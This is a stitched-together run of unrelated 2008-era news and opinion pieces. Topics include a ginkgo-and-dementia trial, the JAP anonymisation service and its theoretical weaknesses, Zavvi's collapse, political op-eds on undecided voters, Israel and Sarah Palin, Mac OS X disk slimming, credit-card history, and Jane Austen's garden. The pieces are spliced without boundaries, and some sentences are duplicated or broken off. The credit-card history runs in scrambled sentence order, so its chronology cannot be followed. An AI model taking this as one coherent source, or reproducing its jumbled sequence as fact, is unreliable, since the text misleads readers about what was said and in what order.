The popular herb ginkgo biloba does not reduce the risk of dementia or Alzheimer 's disease , according to a study of more than 1,500 elderly patients who took the supplement .
Often touted as a way to preserve aging memories , no large - scale , randomized clinical trial -- until now -- has thoroughly evaluated the safety and effectiveness of ginkgo biloba extract as a way to prevent dementia .
Ginkgo extract sales reached $ 107 million in 2007 , according to the Nutrition Business Journal .
In the new government - funded study , volunteers ages 75 and older with either normal mental function or mild cognitive impairment took a twice - daily placebo or ginkgo biloba extract ( for a total of 240 milligrams per day ) .
The researchers tested the volunteers ' memory and other mental abilities every six months for about six years .
Ginkgo supplements were no better than a placebo for preventing dementia , according to the study , which was sponsored by the National Center for Complementary and Alternative Medicine and the National Institute on Aging of the National Institutes of Health .
It appears in the November 19 issue of the Journal of the American Medical Association .
" I 'm disappointed , " says lead study author Steven DeKosky , M.D. , vice president and dean of the University of Virginia School of Medicine .
" It would 've been wonderful to find something relatively well known and inexpensive that might have been helpful and protective . "
DeKosky was chair of the department of neurology at the University of Pittsburgh , in Pennsylvania , at the time of the study .
Why these energy boosters are poor substitutes for sleep
More than 5 million people in the United States have Alzheimer 's disease , according to the Alzheimer 's Association .
It 's the most common form of dementia and affects somewhere between 60 to 80 percent of patients with memory loss and other mental ability problems .
DeKosky says the number of people who will be affected by dementia may triple in the next 20 to 30 years as the baby boom generation ages .
Ginkgo extracts are derived from the leaves of the Ginkgo biloba tree ; they contain substances called flavonoids and terpene lactones , which have appeared promising in laboratory studies for the prevention of Alzheimer 's disease .
However , results in humans have been mixed , at best .
Despite that mixed record , ginkgo extract sales reached $ 107 million in 2007 , according to the Nutrition Business Journal .
Eight natural remedies that may help you sleep
DeKosky says that there were two important conclusions to take away from the study : Ginkgo biloba is ineffective in battling dementia , but also that the herb is relatively safe .
Still , some research has suggested that it may cause excessive bleeding .
In the new study , people taking ginkgo were more likely than placebo users to have a bleeding - related stroke ( 16 events with ginkgo versus eight with placebo ) .
However , the results were not statistically significant and may have been due to chance .
Because of the potential for unknown side effects , " it is untenable to recommend a drug or nutraceutical in the absence of efficacy evidence simply because it could possibly help and initially appears harmless , " Lon S. Schneider , M.D. , of the University of Southern California , Los Angeles , said in an editorial accompanying the study .
Others in the medical community agree that the supplement does n't seem to be worthwhile .
" I do n't think there is a role for ginkgo biloba in human health at this point , " says Gary J. Kennedy , M.D. , director of geriatric psychiatry at Montefiore Medical Center in New York .
" This study was long enough that if ginkgo had any protective capacity to prevent Alzheimer 's or slow cognitive decline , it would have shown it . "
The best way to prevent dementia is to keep the mind active , whether it's by reading books , doing crossword puzzles , playing sudoku , or participating in other creative endeavors , says Kennedy .
All antidepressants work the same , but some pricier than others
DeKosky also says that what 's good for the heart is good for the head ; thus , diet and exercise are also important in keeping the brain sharp .
" I would have loved to have [ ginkgo extracts ] work .
Even if it slowed things down by 20 percent , that 's a huge number , when you multiply it by the millions of people who have [ Alzheimer 's ] disease or are at risk for it , " says DeKosky .
" We did n't do this study just to prove that something did n't work . "

What to know before you buy
The Natural Products Association ( NPA ) , which represents ginkgo manufacturers , released a statement that said the new research can't be used to make broad conclusions because the average age of the participants was nearly 80 , and the findings may not apply to the general population .
" I still think there is great promise for ginkgo biloba , " says Daniel Fabricant , Ph.D. , the vice president of scientific and regulatory affairs at the NPA .

Architecture of the Anonymization Service
The structure of the JAP anonymization service is shown schematically in the following diagram .
It consists of the following components : JAP Client program installed on the user 's computer .
Client program installed on the user 's computer .
Mixes Anonymizing intermediaries which mix the data streams of various users together .
Anonymizing intermediaries which mix the data streams of various users together .
InfoService A separate service which provides meta-information about the available mixes ( that is , mix cascades ) , number of users currently using the mix cascades , and the current load on the mix provider .
How It Works
When you start the JAP client program , JAP first connects to the InfoService to check if the program version is still current .
If the version of the program is no longer compatible with the software of the mix , the user is automatically offered a program update , since otherwise the JAP service could no longer be used .
In the next step , JAP registers with the first mix station of the chosen mix cascade .
A permanent network connection between JAP and the first mix station remains until logoff .
On installation of JAP , the user already configured the web browser so that each packet of data sent goes through JAP instead of directly to the internet .
JAP encrypts the data and sends it to the first mix station .
The first mix station then mixes the data with that of other users and sends it to the second mix station which passes it on to the third mix station which decrypts and sends the data through a cache proxy to the internet .
Each mix carries out cryptographic operations on the message so that the JAP - encrypted data is only readable when it's gone through the proper mixes in the proper order .
That way it 's insured , that an eavesdropper either only receives unreadable ( encrypted ) data or can no longer determine the sender .
In order for it to work correctly , only one mix in the cascade need be trusted not to inform the eavesdropper as to the method of message mixing .
Here is a description of the exact method of encryption .
Weaknesses of JAP
Our goal is to create an anonymization service which is secure against an attacker of almost any strength .
There should be only two restrictions :
A mix in the cascade should not be controlled by an attacker and should not work together with an attacker .
The attacker should not control all other users .
( An attacker could then observe a single real user , since the real user is alone and the attacker would know that all data which the attacker himself did n't send came from that single user . )
Otherwise the attacker is allowed to try anything .
He can listen to all connections , attempt to manipulate or delete any data , or even insert new data messages .
Possible Attacks JAP is not yet secure against such a strong attacker .
Two theoretical attack possibilities against our service will now be described :
If an attacker keeps all network connections under surveillance , each user would have to send and receive exactly as much data as any other user .
Otherwise the attacker , who observes both the connection to the user and the connection to the internet after the final mix , could correlate a user based on the amount of data sent .
If one user sends more data than all the other users , that 's most likely the one communicating with another user who is receiving large amounts of data at the end of the cascade .
Currently , we can't defend against such an attack for various reasons .
Users have different connection speeds and varying amounts of activity at any given time .
If one wanted to achieve an equivalent behavior pattern among all users who have the same connection speed , yet maintain a similar quality of service , the mixes would require many times the current bandwidth .
In addition , any disturbance experienced by a single user would have an effect on all other users , since they would have to wait until the one user with the connection problems sent as much data as all the rest .
A second theoretically possible attack is as follows : Currently a single attacker could simulate multiple users by simply starting several JAP client programs .
That way , he could at least fool the remaining users into believing in a higher amount anonymity than what is really available .
If the attacker would furthermore block all real users except for one , the anonymity of that single remaining user would be completely eliminated .
To prevent this kind of attack , it would be necessary to authenticate every user at login , for example with a digital signature .
With a pay - based service , such an attack could at least be made very expensive for the attacker .
There are currently still other attacks possible , since the planned basic functions are not yet completely implemented .
On the other hand , an attacker would have to be relatively strong in order to succeed in any attack known to us .
You are already protected against an eavesdropper who can only eavesdrop on one point of the network or who controls only one of the mixes .
Reasearch on JAP
The number of data packets per user on the Dresden - Dresden cascade are ocassionally , and for strictly limited time periods , counted for reasearch purposes .
However , this tracking is not linked to individuals .
The data is statistically processed and subsequently deleted .

Restrictions for the Dresden ( JAP ) anonymisation servers
After careful consideration we have decided to restrict the size of downloads over the Dresden ( JAP ) mixes a little .
The reason is to allow a more fair use of scarce resources of our servers especially for users who simply want to surf the Web .

More than 3,000 jobs at high street music retailer Zavvi were at risk today after the company was placed into administration .
Zavvi , the former Virgin Megastore chain , called in Ernst & Young after it was crippled by the collapse of Woolworths ' Entertainment UK wholesaling division .
Download the new Independent Premium app Sharing the full story , not just the headlines
Tom Jack , joint administrator , said : " In the absence of a buyer for EUK , and with dire trading conditions on the high street , the Zavvi group has seen a material fall in sales and the directors have now been forced to place parts of the group into administration . "
Ernst & Young has been appointed as administrator of Zavvi UK and liquidator of Zavvi Guernsey , although Zavvi Ireland is not subject to any formal insolvency proceedings .
Zavvi is the third retailer in 24 hours to call in administrators as the high street squeeze claims a growing number of casualties .
Ernst & Young said all 125 Zavvi UK stores will open as normal on Boxing Day for the post - Christmas sales , and will stay open while a buyer is sought .
Mr Jack said : " The administrators intend to continue to trade Zavvi UK with a view to selling all or part of its business as a going concern .
" We are grateful for the continued support of all employees during this difficult time and would like to thank everyone at Zavvi for their commitment and hard work as the business continues to trade . "
Zavvi currently employs 2,363 permanent staff and 1,052 temporary staff across the group .
It is the largest independent entertainment retailer in the UK and has 125 stores - 114 in the UK and 11 in Ireland .

Simon Douglas and Steve Peckham , the group 's founders , said : " We would like to thank all of our employees for their commitment and support since the launch of Zavvi .
" We have done all that is possible to keep the business trading , but the problems encountered with EUK , and particularly its recent failure , has been too much for the business to cope with . "
The EUK distribution business was Zavvi 's main supplier and its collapse last month left Zavvi unable to take customer orders .
Ernst &
Young said it believes EUK is unlikely to be sold as a going concern , adding that Zavvi had continued to face difficulties in sourcing stock on favourable terms .
" This has resulted in considerable working capital difficulties as a result of the failure of EUK , in addition to continuing operating losses , " it said .
Mr Jack said : " Since EUK went into administration , and perhaps before , the impact of problems at EUK on the Zavvi group has been significant .
" Minimal deliveries , no returns and worse trading terms are just some of the areas impacted . "
Earlier this month , 700 workers were made redundant from EUK's head office and distribution centres in Middlesex after administrator Deloitte 's efforts to sell the business as a going concern stalled .
EUK will continue operating for the moment with a reduced workforce of 375 .
Yesterday , tea and coffee merchant Whittard of Chelsea was also placed in administration , but the 122 - year - old company will remain on the high street after administrator Ernst & Young sold the firm to private equity company Epic in a rescue deal .
Struggling British menswear retailer The Officers Club also fell into administration last night but was snapped up by management in a deal which saved more than 900 jobs .
A new company backed by David Charlton , chief executive of The Officers Club , took on 118 of the firm 's 150 stores .
But the remaining 32 stores are to close immediately .
In recent months the high street has witnessed a swathe of retail failures as companies crumpled under the weight of soaring costs , falling consumer spending and the credit crunch .
The festive selling season - which should be the highlight of the retail calendar - long ago turned into a bloodbath as shops fought tooth and claw to retain market share .
Discounting started weeks early across the high street in an attempt to kick - start consumer spending .
Zavvi started its sale on Monday and other retailers have announced plans to slash prices by up to 90 per cent .
Undecided ?
Really ? /
Who the hell are you ?
Are you evil ?
Are you Jesus ?
I 'm told it is sometimes helpful to project outside yourself , to mess with your own ideological boundaries , to attempt , however exasperatingly and however much it makes you want to hose yourself down with the cool fire of intellectual clarity afterwards , to enter the minds of your enemies , or those with whom you merely disagree , or -- perhaps most challenging of all -- with those whose mental gyrations you simply cannot fathom in the slightest .
Behold , the Undecideds .
Have you heard of this bizarre , nefarious group ?
The millions of faceless , slow - blinking , mentally unattached Americans who are , right this minute , with mere days to go before the most historic election in our lifetime and when faced with what seems to be the most glaringly obvious divisions of attitude and perspective you could possibly imagine , still " on the fence " about Obama or McCain , love or hate , country or disco , Paris or Fresno , oil or water , Porsche or Pinto ?
Do you know anyone from this group ?
Those who have the uncanny ability to stare straight at the biggest issues and most momentous decisions of their very lives , and shrug ?
Odds are very good you do .
Because they are , apparently , legion .
And pivotal .
And they are , it must be said , one of the most baffling groups in world history .
Impenetrable .
Unnerving .
As such , it is perhaps a worthy experiment to try to enter the Undecided mind , to examine what might be going on -- or , as the case may be , not going on .
What we risk : instant madness , increased frustration , screaming .
What we stand to gain : perspective , empathy , more screaming .
Shall we ?
Firstly , some quick assumptions .
I hereby assume the Undecideds are not the Classic American Zombie .
They are not the socially and politically ignorant , the millions of culturally apathetic , uneducated Americans you often read about who live way off the intellectual grid , who do n't read , do n't vote , do n't eat with utensils , do n't care , do n't know how to care and have never really evolved their own intellectual curiosity much beyond the walk - upright - and - don't - drool stage .
In other words , the Undecideds still pay attention .
Sort of .
This , perhaps , is the first major snag : From what I can glean , it seems the Undecideds pay just enough attention .
They care a little , maybe just enough to vote , to take part in a political tracking polls and interviews , to latch onto irrelevant effluvia , to nod with brow - furrowed interest when their more attuned friends speak passionately about a given issue .
But that 's about as far as it goes .
For an Undecided , then , everything is received wisdom .
Everything is a mishmash of external sources , a haphazard blur of everyone else 's ideas , headlines , tidbits of disconnected thought and rumor , and the thing they believe most is merely the last thing they heard that " sounded about right . "
Upshot : no original thought .
No sifting and sorting and careful deliberation , resulting in a calm statement of self - determined purpose .
There is only , perhaps , fear of taking a stand , of having an opinion , of believing in something , anything , lest you be proven ignorant or pitiable or Britney Spears .
Psychology experts , start your engines .
If this definition holds true , if there 's such a large and powerful group that , given its lethargic inability to make distinctions , requires all sorts of trickery and flash to hold their fleeting attention , well , it makes the Undecideds a rather hugely dangerous lot indeed .
And sort of pathetic .
And really lousy in bed .
Or maybe not .
Maybe I have it exactly backwards .
Maybe the Undecideds are the most evolved among us , more aware and conscious than the rest of us desperate plebes who are far too eager to plant our flags in the treacherous soil of definitive thought .
Possible ?
Could it be that the Undecideds have developed an enlightened , Zen - like meta- perspective , wherein they see all social melodramas and political extremes as essentially the same , all part of the Grand Cosmic Circus ?
And therefore deciding something as piffling as Obama versus McCain -- that is , whether to kick human experiment forward with intelligence and thoughtfulness , or lock it into conservative Tupperware and shove it in the back freezer for another 30 years -- is pointless and unnecessary , merely part of the same cosmic joke ?
Hell , I 've oft championed the necessity of keeping your mind juicy and spirit fluxive , of never letting dogma bog you down and clog your karmic drain .
Have the Undecideds mastered this rare skill ?
Let me just hedge a tentative answer right here : not a chance .
After all , there 's a profound difference between lucid energetic fluidity and , well , mealy mental dithering .
One more possibility : The Undecideds might be largely made up of the politically disenchanted , the remnants of the ideological fringe , libertarians and the Independents and the Ron Paul / Nader fanatics who , since their dreamy marginal candidate has been relegated back to footnote status , are trained to merely see the other options as equally worthless , cogs in the same corporate machine .
I 'm not buying it .
For one thing , most of those activists have a clearly demonstrated -- if a bit wonky -- ability to choose .
And let 's just say it outright :
Even if you can't tell much difference between Obama 's and McCain 's tax policies or approaches to Pakistan or whatnot , the difference in intuitive energies , in sheer vibrational attitude , between the calm , deeply intelligent Harvard - trained senator and the curmudgeonly war hawk with a nasty temper are so profound as to keep entire nations awake at night .
It 's a bit like choosing between a glass of wine and a beer bong full of turpentine and carpet tacks .
Sure you can ingest them both , but come on .
Do not misunderestimate .
I do not mean to suggest that it 's mandatory that everyone take some sort of extreme black / white position every time .
It is not about grabbing a mulish , uninformed stance and never budging .
Moderate , reflective positioning is fine .
But that 's still a position .
Undecideds are n't moderates .
They do not seem to be clear on what they value , exactly .
They 're just ... I 'm not sure what .
Confused ?
Simple ?
Overmedicated ?
The days are dwindling .
The choice is nigh .
And the strange news is , somewhere between 10 to 15 percent of the voting nation is still undecided , still unsure , still apparently waiting , after countless debates and speeches , thousands of articles and profiles and policy wonkings , biographies , autobiographies , detailed lists of everything from the type of foods the candidates like to sports teams they root for to the kind of car they drive , for some impossible fog to clear .
The good news is , this election probably wo n't hinge quite so dramatically on the Undecideds ' final decision , whatever the hell it might be .
The bad news is , these infuriating creatures of tepid doom show no signs of going extinct anytime soon .

The value that the U.S. - Israel relationship has to both partners of the alliance is incalculable not only because of its strategic importance , but also because it projects values that matter deeply to the American people .
In their address at MIT on Oct. 3 , academics Stephen M. Walt and John J. Mearsheimer argued that support of Israel is not an American interest , and to advance their claim , they suggested that lobby groups run largely by American Jews control and dictate American foreign policy — therefore explaining the United States ’ strong relationship with Israel .
As the U.S. - Israel relationship reaches 60 years of unflagging dedication , it is indeed important to consider what precisely is the basis for this strong alliance .
Ultimately , American influence is not aimed at hegemony , but rather is motivated by the sincere conviction that democracy , free - market economy , free press , and Western - styled civil rights optimize the symbiosis between government and people and leads to stability .
Israel is the only regime in its region that possesses these qualities , and therefore American support of Israel demonstrates our commitment to these values and furthermore serves as means of projecting our values into a distant sector of the world .
The thesis Walt and Mearsheimer concoct is that “ Israel ’s security is ultimately not of immediate concern to the United States . ”
Their attitude ( called “ neo- realism ” ) is that America ’s national interests supersede any moral imperative or ethical conscience .
By extension , according to this school , there is no compelling national interest for America to foil genocide in Darfur because that might interfere with our relationship with petroleum - exporting countries .
This bothers me , and I believe it should bother you .
Values matter ; they define who we are .
American foreign policy attempts to make good on those values , and although oftentimes we may fall short of this noble goal , our national interests will always be tied to them , which is why the Israel Lobby continues to be germane .
Israel is perhaps the single most reliable , capable , and willing friend of the United States in its region and in the world .
That statement is not a romanticization but is empirically verifiable by the fact that Israel ’s support for the United States ’ positions in international forums ( like the United Nations ) has surpassed any other governments ’ — even those of other Western countries such as France , Britain , and Canada — for the last 60 years .
Democrats and Republicans across the board have been unified in one voice supporting American friendship with Israel .
Whereas support for America among European countries sways with changes in political climate and zeitgeist , Israeli support for America is simply a fact of life .
Likewise , in poll after poll , Americans say that they want to support Israel .
According to a Gallup poll from February 2007 , more than half of Americans rated Israel as a “ vital friend , ” while 55 percent of the respondents rated the Jewish State as “ favorable ” and “ important , ” the only country to be named in both categories .
Polls of the House and Senate reveal that 93 percent of representatives and 85 percent of senators express the same sentiments .
Legislation that supports Israel ( such the Iran Freedom and Support Act of 2005 ) pass Congress with the highest margins and receive bipartisan support , because Israel ’s national security concerns and America ’s national security concerns are inextricably linked .
The shared security interest was true during the Cold War and continues to be true in the present global war on terror .
Every American president since Harry S. Truman has personally supported Israel , including Jimmy Carter , who despite his recent change in heart , stated during his own administration : “ The survival of Israel is not a political issue , it is a moral imperative .
That is my deeply held belief and it is the belief that is shared by the vast majority of the American people … a strong secure Israel is not just in Israel ’s interest .
It ’s in the interest of the United States and in the interest of the entire free world . ”
In the summer of 1942 , 400 rabbis went to Washington , D.C. to lobby Congress to take steps to rescue the Jews of Europe , but most people said America had no compelling national interest to do so .
American fighter jets flew past Auschwitz in 1944 and bombed a rubber factory nearby instead of saving potentially millions of lives .
In 1984 , the United States funded Operation Moses , a covert project that airlifted 8,000 black Jews from Sudan to Israel who were at risk of being murdered by para-military groups .
The operation took American taxpayer dollars and was done at the risk of alienating oil - exporting regimes .
Why was American policy so different in 1984 than in 1942 ?
Perhaps because there was an Israel Lobby that called on America to act upon its values by intervening in the international arena , just as it now does vis -à - vis Darfur .
While some may protest that the operation did not advance American interests , I am proud that American policy sometimes upholds ideals instead of surrendering to the pressures of geopolitical forces like oil and nationalism .
Israel has similarly committed itself to the same ideals by having the highest percent of its GDP committed to international humanitarian aid and by welcoming the highest number of Darfurian refugees from Sudan of any country in the world .
As we approach the 60th anniversary of the American - Israeli relationship , I am confident that the alliance will continue to be mutual , voluntary , and strong .

McCain 's running mate , Alaska Gov. Sarah Palin , speaking in Colorado Springs , Colo. , said Fannie and Freddie had " gotten too big and too expensive to the taxpayers . "
The companies , however , are n't taxpayer funded but operate as private companies .
The takeover may result in a taxpayer bailout during reorganization .
Well , McCain campaign advisor Todd Harris said they did n't want Alaska Governor Sarah Palin to make a mistake early on , and that 's exactly what happened today .
Palin , commenting on the news that the Federal Goverment was going to take over the poortly performing loan organizations Freddie Mac and Fanny Mae , apparently did not know that the firms were privately owned and held .
Palin said this , as written by the McClatchy Washington Bureau
It 's this basic lack of knoweldge of Federal Government operation that both Obama / Biden supporters and GOP backers who questioned McCain 's logic in selecting Palin are concerned with .
Palin has no experience in talking about , let alone working to solve , Federal Government problems and policy matters on a regular basis that many wondered if McCain would have to engage in " on the campaign trail " training .
It appears that 's the case .
This comes a week before Palin 's scheduled ABC interview .
Just short of two weeks after first offering widescreen video , YouTube has rolled out widescreen embeddable videos , with a new standard search feature .
The new embeds deliver a 16:9 ratio for widescreen vidoes , allowing sites to show a full widescreen video without black above or below the video .
Notably each embed now includes a YouTube search box ; either a handy feature or annoying depending on your perspective .
The new embeds are not retrospective , so existing embeds retain the 4:3 aspect ratio .
I noted on Twitter 2 weeks ago how that I was disapponted that YouTube did n’t role out widescreen embeds with the general widescreen rollout ; most video producers or uploaders like having the option of widescreen , but having it on site and not via embed seemed a little unfair .
Guess the tail was slow in wagging .
Here ’s an example of a widescreen YouTube embed from our Livestation iPhone post :
When working with Leopard on laptops , make sure to consider the realities of older units with less space and / or small solid state drives .
Leopard typically clocks in at over 8 GB for a typical install .
That leaves very little space on an old 20 GB hard drive ( vintage TiBook , anyone ? , although all things are possible to those who believe ) or a 16GB ( or even 64GB ) solid state drive for your personal data and media .
Going portable can mean going small .
And Leopard , with its standard packages , is anything but that .
So how are you supposed to deal with its masses of data , support files and bloated applications ?
Fortunately , you are not alone .
The question of Leopard size , and Tiger before it , has been well explored with a number of excellent tools that will help you bring your overgrown installation under control .
Here are five ways you can slim down your Mac OS X install and make the most of the disk space on offer .
There 's lots of stuff in your install that you do n't need , do n't want , and will never use .
A thoughtfully slimmed - down OS X discards those unneeded elements and leaves you more room for the items you do want .
Tossing your apps
Although Leopard ships with many fabulous applications , there are bound to be some that you simply do n't want .
If you do n't use Chess or Photo Booth or Stickies for example , consider deleting them .
That 's not to say that you should delete applications you do use occasionally .
You 'll be kicking yourself hard if you toss System Profiler or Disk Utility and then have to use them at some point .
Consider how you use your laptop and the tools you need ; this will help guide your choices .
As a rule of thumb , when you have a desktop system at home or the office that you regularly network to in addition to your laptop , you can take more risks when deleting apps .
Your backups are right there whenever you need them .
Be aware , though , that most Applications involve more than an executable in your Applications folder .
Utilities like AppZapper and AppCleaner clean out an application 's associated files and folders , as well as the app itself .
Extra items may include Application Support folders , preferences files or panes , caches and more .
App cleaners produces leaner Mac OS X installs by thoroughly deleting applications and support files ; at the same time consider that a full uninstall may complicate reinstallation should you need to ever use those applications again .
Remove languages and PowerPC code
Localizations allow you to use your applications in many languages ; you control your language choice through the System Preferences International settings pane .
Your menus , buttons , and dialogs all adjust to the language of choice , be it English or Italian , Japanese or French .
Unfortunately , all this language support takes up a lot of space on your disk .
There are tools out there that recover that space by removing language support that you wo n't use .
In addition to languages , another OS element that takes up space on your disk is Power PC support .
Inside each of those universal binaries , there 's PowerPC code that you will never use on an Intel machine .
XSlimmer , Monolingual , and Trimmit allow you to remove both foreign language support and nonnative code at the same time .
These tools greatly compress your Application folder , sometimes by as much as a gigabyte .
The cost to this choice is that it locks you in to a language .
That may not be a huge deal if you work exclusively in English .
Europeans who work with many languages may find themselves better served by skipping language extraction or carefully choosing which languages to delete from their system .
Update : Language removal can also mess up Office 2008 updates and , I 'm told , Adobe apps .
Weed through printer drivers , screen savers , and more
Large tracts of Mac OS X disk space are devoted to support files that , frankly , you 'll never use .
As a general purpose operating system , OS X offers many more choices than most people need or want .
You can fight the bloat by cleaning out support areas that do not affect you .
For example , you may want to limit your printer drivers ( / Library / Printers ) , Dashboard Widgets ( / Library / Widgets ) , Screen Savers ( / Library / Screen Savers ) , or synthetic voices ( / System / Library / Speech / Voices ) .
The Alex voice alone occupies over 600 MB of disk space .
If you wo n't need them , onboard dictionaries in / Library / Dictionaries represent another area of slimming opportunity ; they weigh in at almost half a gigabyte .
Some smaller targets should n't be overlooked .
At almost 100MB , / System / Library / Desktop Pictures has a lot of data you can probably live without .
The Setup Assistant in / System / Library / CoreServices is about 70MB , and includes that cute Leopard video that plays when you first install the system .
In / System / Library / Fonts , you 'll find several Asian fonts that occupy almost 75 MB of space .
You may also want to thin out / System / Library / Compositions , the quartz composition folder , with its 50 MB of QuickTime movies .
Some slim - down guides suggest you hunt down readme files and zap them from your drive , but I 'm going to argue against that .
Readme files are typically quite small and often they contain helpful information that you wish you 'd kept around .
So for very little benefit , you 're losing potentially useful materials .
Do n't install X11
If you wo n't be needing to use X11 on your laptop , try not to install it in the first place .
Switch off its checkbox in your initial Leopard install .
Should you need it later , it appears on your installation disk under the optional installs folder .
You can also weed out many printers during this same customization stage of the install process .
Evaluate your disk
A utility like Grand Perspective displays disk usage in graphical terms .
Use it to track down large files that you 're not using .
Mousing over any block shows you exactly where each file is located .
I use Grand Perspective to find many of the screen savers , dictionaries , and fonts that no longer live on my system .
As this screenshot shows , some files are enormous .
See that big red blob ?
That 's my laptop 's hibernation files .
And , like many other nonstandard Mac OS X laptops , mine does not properly sleep .
If your laptop is a nonsleeper , you might consider tossing / var / vm / sleepimage ; this file could possibly save a gigabyte of space .
You might also end up reinstalling your system when the sleep issues are fixed , so only consider moving forward with this space reclamation if you really know what you 're doing .
Although a couple of forums suggested removing this file , I have not yet done so on my laptop .
I am a coward .
That 's the important lesson there .
Although the worst situation you 'll deal with when slimming Mac OS X is reinstalling the OS , doing so can eat up time that you do n't actually have .
It 's especially annoying when you have to recustomize all your settings and re-install all your personal software .
In the end , move prudently before you make any critical change to your system .
I have removed many applications , monolingualed , tossed drivers and screensavers , and made many other adjustments as needed .
You may want to Google for peoples ' experiences if any particular strategy like the hibernation file one seems overly dubious .

I have been reading as many advisories as I can on how we need to proceed to restore our economy .
There seems to be consensus that a jobs plan , one rebuilding the nation ’s infrastructure , is needed .
There certainly agreement on economic reform .
Other means seem to have less of a solid consensus , but there is one thing I have not seen suggested by even one single pundit , economist or legislator .
Not one time have I seen it suggested that we even attempt to return this nation to being a producer nation instead of a consumer nation .
Not one place have I seen a suggestion that we need to recreate the industries , other than automobile , that manufacture the things that American consumers buy .
In the political campaigns there was rhetoric aboutand That rhetoric did n’t include any specifics about bringing back the jobs that had already been exported .
In all of the current discussions about the economic recovery , however , the discussion of manufacturing jobs , other than auto , has been noticeable by its absence .
Not that there is inherent superior value to things that are made in this country , but there is value in having the jobs that manufacturing in this country can provide .
Buying does not provide jobs ; manufacturing provides jobs as well as products that Americans buy .
So that when I buy a toy for my kid it says , So that when I buy a television it says , So that when I buy a part for my car , not the car itself , but a starter , or a windshield wiper it says , So that when I put on my shirt in the morning it says , Maybe restoring our producer economy cannot be done .
Maybe the foreign competition has labor costs that we cannot meet .
Maybe we are not innovative enough , or smart enough , or we just do n’t care enough to overcome that deficit .
But we are not even trying .
No one is even suggesting that we try .
It seems sufficient that we manufacture automobiles from imported parts , and that we import everything else .
It used to be that “ third world ” countries were considered inferior because they could not manufacture , and they had to import manufactured goods from us .
Now those same countries are providing the manufactured goods that we are importing .
We do n’t seem to feel that makes us inferior .
I do n’t think we are inferior .
I think we can be a producing nation , or at least I do n’t know why we can ’t .
I do n’t understand why we are not making the effort .
There ’s something uncomfortable about being a “ nation of consumers . ”
But it was 1980 , South Dakota 's economy was a mess , and suspicion was an instinct that Janklow could not afford .
" We were in the poor house , '' he recalled .

Had circumstances been less dire , the news of four urgent phone calls from a New York bank in a single day likely would have been easier to ignore .
" Nobody 's historically more suspicious of outsiders than South Dakotans , '' Bill Janklow , the former governor of South Dakota , told FRONTLINE in a recent interview .

» " A Little Gift From Your Friendly Banker " How the U.S. credit card usage took off -- a 1970 Life magazine article that was one of the first comprehensive overviews of the industry .
It was just before Christmas when five million cards were dropped by a group of Midwestern banks scrambling to be the first to reach the untapped Chicago market of holiday shoppers .
Cards were mailed to convicted felons , toddlers , even dogs .
A frenzy ensued .
Nightly news reports ran stories about corrupt postal workers feeding stolen cards to organized crime rings .
Suburban housewives who had never received cards were getting billed for thousands of dollars of charges .
Still , the first decade of " credit cards drops " had produced little profit and a lot of chaos .
People were outraged by what some called usurious temptations , and bankers were flooded by massive defaults .
In 1966 , an incident dubbed " the Chicago debacle " unleashed an intense wave of public venom .
Before long , banks all over were using credit cards to compete for new customers .
But the concept of far - off banks soliciting the masses with open - ended lines of credit challenged the traditions of small - town lending .
" We had one bank , " Mr. Wriston said of his home town of 30,000 .
" And the old guy with a green eyeshade gave you credit or he did n't . "
" ' What is this with people wanting credit ? ' "
Mr. Wriston recalled being asked by his boss at Citibank .
" And I said , ' Look , we just put five years of our life in a brown suit carrying an M1 rifle , and we want the refrigerator now . ' ''
The industry 's ambition was evident from its earliest days .
When Bank of America launched the nation 's first general - purpose credit card in 1958 , it simply dropped 60,000 of them in a mass mailing to residents in Fresno , California .
The bank hoped to attract customers with a new type of " revolving " credit line , which could be used for purchases everywhere and paid off over time .
The idea was to tap into the pent - up consumer demands of World War II baby boomers .
Those long ago phone calls were a pivotal moment in the ascendancy of America 's credit card industry .
A notorious loss leader became the most profitable sector in banking , generating nearly $ 30 billion in net revenue last year alone .
The unlikely alliance would clear the way for Citibank to turn a money - losing credit card operation into a vastly profitable business .
" All of their senior people used to say it , '' Mr. Janklow said .
" That South Dakota saved Citibank .
I believe it did .
That South Dakota saved Citibank . ''
But the bankers saw opportunity and salvation in the plains of South Dakota .
Within days of those first phone calls , a team of top executives arrived from New York with a proposal for Mr. Janklow :
If South Dakota would quickly pass legislation that would enable Citibank to move its credit card operations to the state , they would bring hundreds of high - paying white collar jobs to the state .
The bank had lost more than $ 1 billion on its audacious foray into the credit card business , and the future looked even worse .
The trouble , simply put , was that the rate of inflation exceeded the amount of interest Citibank was allowed to charge its credit card customers under New York usury laws .
The calls were from Citibank , which was having a serious problem of its own .
" It was very simple , '' said Walter Wriston , then the chairman of Citibank .
" We were going broke . ''
Jane Austen museum forced to ban fans from scattering human ashes in her garden
Author : Drawing of Jane Austen
The 17th - century cottage , with its quintessentially English garden filled with flower beds and herbs , has long been a place of pilgrimage for devotees of Jane Austen .
Now it seems increasing numbers are choosing the author 's former home , which has become a museum in her honour , as their final resting place .
Museum staff have been shocked to find mounds of human ash around the grounds , left by relatives creeping in to honour the final wishes of loved ones .
But the management of Jane Austen 's House Museum has moved to halt the practice .
In an open letter to the Jane Austen Society , collections manager Louise West wrote : ' While we understand many admirers of Jane Austen would love to have ashes laid here , it is something we do not allow .
' It is distressing for visitors to see mounds of human ash , particularly so for our gardener .
Also , it is of no benefit to the garden !'
Austen moved to the cottage at Chawton , Hampshire , in 1809 , when she was 33 .
She wrote or revised all her novels there , including Pride And Prejudice , Persuasion and Emma .
Mrs West said : ' On three or four occasions our gardener Celia Simpson has found piles of human ash placed in the garden secretly .
' I suppose it was the ashes of someone who was a great lover of Jane and they had asked their friends or relatives to do this , or their family felt it would be nice .
' But we do n't really feel it 's appropriate .
If it enriched the soil we would n't mind so much but the ashes have no nutrients at all . '
Austen lived at the cottage with her mother and sister Cassandra after the death of their vicar father .
Novelist 's former home in Chawton , Hampshire
She spent eight years there until ill health forced a move to Winchester in 1817 to be closer to her doctor .
She died six weeks later .
Jane Austen expert Professor Kathryn Sutherland , of Oxford University , said : ' I can imagine people wanting their ashes close to a well - loved author .
' The appeal of Jane is that she is very comforting and gives the reader solace , almost like a friend . '
The author herself , renowned for her sense of fun , would have been delighted by the practice , according to Mrs West .
She said : ' I think she would think it 's hilarious and be thrilled she inspired such devotion ' .
Emanuel Was Director Of Freddie Mac During Scandal New Obama Chief of Staff and others missed " red flags " of alleged fraud scheme .
November 7 , 2008  -- President - elect Barack Obama 's newly appointed chief of staff , Rahm Emanuel , served on the board of directors of the federal mortgage firm Freddie Mac at a time when scandal was brewing at the troubled agency and the board failed to spot " red flags , " according to government reports reviewed by ABCNews.com .
